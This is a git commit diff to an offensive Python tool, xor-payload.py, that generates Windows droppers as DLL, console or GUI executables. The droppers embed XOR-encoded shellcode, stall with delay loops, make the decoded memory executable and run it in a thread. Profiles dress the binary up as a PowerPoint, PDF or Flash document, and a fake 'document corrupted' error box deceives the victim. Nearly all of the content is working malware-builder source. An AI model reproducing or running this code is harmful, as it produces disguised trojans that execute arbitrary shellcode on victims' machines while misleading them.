81d44cae09a3c60b2fb5ec698d324de6201a2a59
hugsy <hugsy+github@pyc.li>
2015-11-18 10:06:07 +1100

    xor: can generate dll/console exe/win32 exe

--- xor-payload.py
+++ xor-payload.py
@@ -11,7 +11,6 @@ Refs:
 - https://msdn.microsoft.com/en-us/library/aa381043(v=vs.85).aspx
 
 ToDo:
-- dll generation
 - multi byte key
 - obfuscate generated C code
 """
@@ -26,7 +25,7 @@ import argparse
 
 HOME = os.getenv( "HOME" )
 MINGW_BIN = HOME + "/.wine/drive_c/MinGW/bin"
-ICO_DIR = HOME + "/ico"
+ICO_DIR = HOME + "/tmp/ico"
 PROFILES = {
         # index : [Version, /path/to/ico, CompanyName, Description, Name, CopyrightName]
         "powerpoint":   [ICO_DIR+"/powerpoint.ico", "14,0,0,0", "Microsoft Corporation", "Microsoft PowerPoint presentation", "PowerPoint", "Microsoft PowerPoint", "powerpoint.exe", ".pptx"],
@@ -35,6 +34,154 @@ PROFILES = {
         "flash":        [ICO_DIR+"/flash.ico", "11,0,0,0", "Adobe Systems Incorporated", "Adobe Flash macro", "Flash", "Adobe Flash", "flash.swf", ".swf"],
         "pdf":          [ICO_DIR+"/pdf.ico", "13,0,0,0", "Adobe Systems Incorporated", "Embedded Adobe PDF document", "Adobe PDF Reader", "Adobe AcroRead", "AcroReader.exe", ".pdf"],
         }
+
+
+HEADERS_C_CODE = """
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <tchar.h>
+#include <process.h>
+#include <sys/types.h>
+#include <time.h>
+#include <ctype.h>
+#include <windows.h>
+#undef DEBUG
+
+#define BIG_NUMBER 100000000
+"""
+
+STUB_C_CODE = """
+DWORD WINAPI SpawnShellcode(LPVOID lpSc)
+{
+  __asm__("movl %0, %%eax\\n\\t"
+          "call %%eax"
+          : : "r"(lpSc) : "%eax");
+  return 0;
+}
+
+unsigned char* AllocAndMap(HANDLE *hFile, unsigned char* sc, DWORD dwBytesToRead)
+{
+  unsigned char* code; DWORD  dwBytesRead;
+  code = VirtualAlloc(NULL, dwBytesToRead, MEM_COMMIT, PAGE_READWRITE);
+  if (!code) {
+#ifdef DEBUG
+    printf("[-] VirtualAlloc\\n");
+#endif
+    return NULL;
+  }
+
+  if (hFile) {
+    if( !ReadFile(*hFile, code, dwBytesToRead, &dwBytesRead, NULL) || dwBytesRead != dwBytesToRead ) {
+#ifdef DEBUG
+      printf("[-] ReadFile\\n");
+#endif
+      VirtualFree(code, dwBytesToRead, MEM_RELEASE);
+      return NULL;
+    }
+  } else if (sc) {
+    code = memcpy(code, sc, dwBytesToRead);
+  }
+
+  return code;
+
+}
+
+void DecodeShellcode(unsigned char* code, int len)
+{
+  unsigned long i,j;
+  for(j=BIG_NUMBER; j; j--){}
+  for(i=0; i<len; i++){code[i] ^= key++; key %= 256;}
+  for(j=BIG_NUMBER; j; j--){}
+  return;
+}
+
+"""
+
+TEMPLATE_C_CODE = """
+int len = sizeof(buf);
+DWORD pID;
+char* code;
+DWORD lpflOldProtect;
+HANDLE hdlThread;
+int retcode;
+
+#ifndef DEBUG
+FreeConsole();
+#endif
+if (!key) exit(1);
+code = AllocAndMap(NULL, buf, len);
+if (!code) exit(1);
+
+#ifdef DEBUG
+printf("[+] Shellcode alloc-ed at %p\\n", code);
+#endif
+
+#ifdef DEBUG
+printf("[+] Decoding using key=%#x\\n", key);
+#endif
+DecodeShellcode(code, len);
+
+if(!VirtualProtect(code, len, PAGE_EXECUTE_READWRITE, &lpflOldProtect)){
+#ifdef DEBUG
+printf("[-] failed to set 0x%p as executable\\n", code);
+#endif
+VirtualFree(code, len, MEM_RELEASE);
+exit(1);
+}
+#ifdef DEBUG
+printf("[+] Page %p set as executable\\n", code);
+printf("[+] Detaching from console and triggering shellcode\\n");
+FreeConsole();
+#endif
+
+hdlThread = CreateThread(NULL, 0, SpawnShellcode, code, 0, &pID);
+
+WaitForSingleObject(hdlThread, INFINITE);
+VirtualFree(code, len, MEM_RELEASE);
+"""
+
+TEMPLATE_WIN32_CODE = """
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
+{
+""" + TEMPLATE_C_CODE + """
+MessageBoxA(NULL,
+"The document you are trying to read seems corrupted, Windows cannot proceed.\\n"
+"If this happened for the first time, try re-opening the document."
+"\\n\\nError code: 0xffffff96"
+,
+"Windows Error",
+MB_ICONERROR | MB_OK);
+
+return retcode;
+}
+"""
+
+TEMPLATE_EXE_CODE = """
+int main(int argc, char** argv, char** envp)
+{
+""" + TEMPLATE_C_CODE + """
+
+MessageBoxA(NULL,
+"The document you are trying to read seems corrupted, Windows cannot proceed.\\n"
+"If this happened for the first time, try re-opening the document."
+"\\n\\nError code: 0xffffff96"
+,
+"Windows Error",
+MB_ICONERROR | MB_OK);
+
+return retcode;
+}
+"""
+
+TEMPLATE_DLL_CODE = """
+void __declspec(dllexport) ControlRun(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
+{
+""" + TEMPLATE_C_CODE + """
+
+return;
+}
+"""
 
 def echo(fd, m):
         os.write(fd, m)
@@ -97,20 +244,9 @@ END
 """.format(*prof))
         return cname
 
-def generate_code_file(fd, key):
+def generate_code_file(fd, key, template="win32"):
         i = 1
-        echo(fd, """#include <sys/types.h>
-        #include <stdio.h>
-        #include <string.h>
-        #include <stdlib.h>
-        #include <time.h>
-        #include <ctype.h>
-        #include <windows.h>
-        #undef DEBUG
-
-        #define BIG_NUMBER 100000000
-        """)
-
+        echo(fd, HEADERS_C_CODE)
 
         echo(fd, "unsigned char key = %d;\n" % key)
         echo(fd, 'unsigned char buf[]=\n')
@@ -127,96 +263,15 @@ def generate_code_file(fd, key):
                 key = (key + 1)%256
         echo(fd, '";\n')
 
-        echo(fd, """
-        DWORD WINAPI SpawnShellcode(LPVOID lpSc)
-        {
-          __asm__("movl %0, %%eax\\n\\t"
-                  "call %%eax"
-                  : : "r"(lpSc) : "%eax");
-          return 0;
-        }
-        unsigned char* AllocAndMap(HANDLE *hFile, unsigned char* sc, DWORD dwBytesToRead)
-        {
-          unsigned char* code; DWORD  dwBytesRead;
-          code = VirtualAlloc(NULL, dwBytesToRead, MEM_COMMIT, PAGE_READWRITE);
-          if (!code) {
-#ifdef DEBUG
-            printf("[-] VirtualAlloc\\n");
-#endif
-            return NULL;
-          }
-          if (hFile) {
-            if( !ReadFile(*hFile, code, dwBytesToRead, &dwBytesRead, NULL) ||
-                dwBytesRead != dwBytesToRead ) {
-#ifdef DEBUG
-              printf("[-] ReadFile\\n");
-#endif
-              VirtualFree(code, dwBytesToRead, MEM_RELEASE);
-              return NULL;
-            }
-          } else if (sc) {
-            code = memcpy(code, sc, dwBytesToRead);
-          }
-          return code;
-        }
-        void DecodeShellcode(unsigned char* code, int len)
-        {
-          unsigned long i,j;
-          for(j=BIG_NUMBER; j; j--){}
-          for(i=0; i<len; i++){code[i] ^= key++; key %= 256;}
-          for(j=BIG_NUMBER; j; j--){}
-        }
-        //int main(int argc, char** argv, char** envp)
-        int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
-        {
-          int len;
-          DWORD pID;
-          char* code;
-          DWORD lpflOldProtect;
-          len = sizeof(buf);
-          HANDLE hdlThread;
+        echo(fd, STUB_C_CODE)
 
-#ifndef DEBUG
-          FreeConsole();
-#endif
-          code = AllocAndMap(NULL, buf, len);
-          if (!code) return -1;
+        if template == "win32":
+                echo(fd, TEMPLATE_WIN32_CODE)
+        elif template == "exe":
+                echo(fd, TEMPLATE_EXE_CODE)
+        elif template == "dll":
+                echo(fd, TEMPLATE_DLL_CODE)
 
-#ifdef DEBUG
-          printf("[+] Shellcode alloc-ed at %p\\n", code);
-#endif
-          if(key){
-#ifdef DEBUG
-            printf("[+] Decoding using key=%#x\\n", key);
-#endif
-            DecodeShellcode(code, len);
-          }
-          if(!VirtualProtect(code, len, PAGE_EXECUTE_READWRITE, &lpflOldProtect)){
-#ifdef DEBUG
-            printf("[-] failed to set 0x%p as executable\\n", code);
-#endif
-            VirtualFree(code, len, MEM_RELEASE);
-            return 0;
-          }
-#ifdef DEBUG
-          printf("[+] Page %p set as executable\\n", code);
-          printf("[+] Detaching from console and triggering shellcode\\n");
-          FreeConsole();
-#endif
-          MessageBoxA(NULL,
-                      "The document you are trying to read seems corrupted, Windows cannot proceed.\\n"
-                      "If this happened for the first time, try re-opening the document."
-                      "\\n\\nError code: 0xffffff96"
-                      ,
-                      "Windows Error",
-                      MB_ICONERROR | MB_OK);
-          hdlThread = CreateThread(NULL, 0, SpawnShellcode, code, 0, &pID);
-
-          WaitForSingleObject(hdlThread, INFINITE);
-          VirtualFree(code, len, MEM_RELEASE);
-          return 0;
-        }
-        """)
         os.close(fd)
         return
 
@@ -231,6 +286,9 @@ if __name__ == "__main__":
                             help="Specify the profile to use ({})".format(available_profiles))
         parser.add_argument("-q", "--quiet", action="store_true", help="Disable verbose output", default=False)
         parser.add_argument("-o", "--output", default=None, help="Specify an output file")
+        parser.add_argument("-d", "--dll", default=False, action="store_true", help="Generate a DLL")
+        parser.add_argument("-e", "--exe", default=False, action="store_true", help="Generate a PE Console")
+        parser.add_argument("-w", "--win32", default=True, action="store_true", help="Generate a PE GUI (default)")
         args = parser.parse_args()
 
         profile_name = args.profile
@@ -241,41 +299,66 @@ if __name__ == "__main__":
                 exit(1)
 
         if not quiet_mode:
-                if profile_name is None:
-                        print("[+] No profile selected")
-                else:
-                        print("[+] Using profile %s" % profile_name.title())
+                print ("[+] Generating random key")
 
-        if not quiet_mode: print ("[+] Generating random key")
         key = random.randint(0,255)
         fd, cname = tempfile.mkstemp(suffix=".c")
-        if not quiet_mode: print ("[+] Generating code in '{}'".format(cname))
-        generate_code_file(fd, key)
 
-        if profile_name is not None:
+        if not quiet_mode:
+                print ("[+] Generating code in '{}'".format(cname))
+
+        if args.exe:
+                generate_code_file(fd, key, "exe")
+        elif args.dll:
+                generate_code_file(fd, key, "dll")
+        else:
+                generate_code_file(fd, key, "win32")
+
+        if profile_name is not None and not args.dll:
+                if not quiet_mode:
+                        print("[+] Using profile %s" % profile_name.title())
 		resfile = create_resource_file( profile_name )
 		res_o = "/tmp/res.o"
 		cmd = "cd {} && wine ./windres.exe {} -O coff -o {}".format(MINGW_BIN, resfile, res_o)
-		if not quiet_mode: print("[+] Generating resources '{}'->'{}'".format(resfile, res_o))
+		if not quiet_mode:
+                        print("[+] Generating resources '{}'->'{}'".format(resfile, res_o))
 		ret = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,)
 		os.unlink(resfile)
+        else:
+                if not quiet_mode:
+                        print("[+] Profile ignored")
+
 
 	suffix = PROFILES[ profile_name ][7] if profile_name is not None else ""
 
         if args.output is None:
-                f, ename = tempfile.mkstemp(suffix=suffix + ".exe")
+                if args.dll:
+                        f, ename = tempfile.mkstemp(suffix=suffix + ".dll")
+                else:
+                        f, ename = tempfile.mkstemp(suffix=suffix + ".exe")
                 os.close(f)
         else:
                 ename = args.output
 
-        cmd = "cd {} && wine ./gcc.exe -D_UNICODE -DUNICODE -DWIN32 -D_WINDOWS -mwindows {} {} -o {}".format(MINGW_BIN, cname, res_o, ename)
-        if not quiet_mode: print("[+] Compiling '{}'->'{}'".format(cname, ename))
+        if args.dll:
+                cmd = "cd {0} && wine ./gcc.exe {1} -shared -o {2}  -Wl,--out-implib,{2}.a".format(MINGW_BIN, cname, ename)
+        elif args.exe:
+                cmd = "cd {} && wine ./gcc.exe -D_UNICODE -DUNICODE {} {} -o {}".format(MINGW_BIN, cname, res_o, ename)
+        else:
+                cmd = "cd {} && wine ./gcc.exe -D_UNICODE -DUNICODE -DWIN32 -D_WINDOWS -mwindows {} {} -o {}".format(MINGW_BIN, cname, res_o, ename)
+
+        if not quiet_mode:
+                print("[+] Compiling '{}'->'{}'".format(cname, ename))
+
         ret = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,)
-        if not quiet_mode: print("[+] Generation completed '{}', removing resources...".format(ename))
+
+        if not quiet_mode:
+                print("[+] Generation completed '{}', removing resources...".format(ename))
 
 	if profile_name is not None:
 		os.unlink(res_o)
-                os.unlink("/tmp/Application.manifest")
+                if not args.dll:
+                        os.unlink("/tmp/Application.manifest")
 
         os.unlink(cname)
 
